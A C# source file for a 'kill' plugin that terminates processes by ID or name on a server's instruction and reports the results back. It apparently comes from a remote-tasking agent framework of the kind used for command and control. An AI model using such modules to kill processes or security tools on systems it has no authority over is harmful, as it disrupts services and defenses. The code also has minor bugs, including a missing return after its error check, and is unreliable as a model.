using System.Diagnostics;
using System.Text;
using System.Text.Json;
using Workflow.Contracts;
using Workflow.Models;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "kill";
        private IDataBroker messageManager { get; set; }
        private ICredentialProvider tokenManager { get; set; }
        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            KillArgs args = JsonSerializer.Deserialize<KillArgs>(job.task.parameters);
            if(args is null){
                DebugLog.Log($"{Name} args null [{job.task.id}]");
                return;
            }
            if(args.id < 1 && string.IsNullOrEmpty(args.name))
            {
                DebugLog.Log($"{Name} no id or name specified [{job.task.id}]");
                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = "No ID or name specified.",
                    task_id = job.task.id,
                    status = "error"
                });
            }

            if(args.id > 0)
            {
                DebugLog.Log($"{Name} killing by id={args.id} [{job.task.id}]");
                await KillById(args, job.task.id);
            }
            else
            {
                DebugLog.Log($"{Name} killing by name='{args.name}' [{job.task.id}]");
                await KillByName(args.name, job.task.id);
            }
            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }
        public async Task KillByName(string name, string task_id)
        {
            StringBuilder sb = new StringBuilder();
            Process[] processes = Process.GetProcessesByName(name);

            if(processes.Length == 0)
            {
                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = "No processes found.",
                    task_id = task_id,
                });
                return;
            }

            Parallel.ForEach(processes, proc =>
            {
                try
                {
                    proc.Kill();
                    proc.WaitForExit();
                    sb.AppendLine(proc.Id+ ": exited.");
                }
                catch (Exception e)
                {
                    sb.AppendLine(proc.Id+ ": " + e);
                }
            });

            messageManager.AddTaskResponse(new TaskResponse
            {
                completed = true,
                user_output = sb.ToString(),
                task_id = task_id,
            });

        }
        public async Task KillById(KillArgs args, string task_id)
        {
            using (var proc = Process.GetProcessById(args.id))
            {
                proc.Kill(args.tree);
                await proc.WaitForExitAsync();

                messageManager.AddTaskResponse(new TaskResponse
                {
                    completed = true,
                    user_output = "Process ID " + proc.Id + " killed.",
                    task_id = task_id,
                });
            }
        }
    }
}
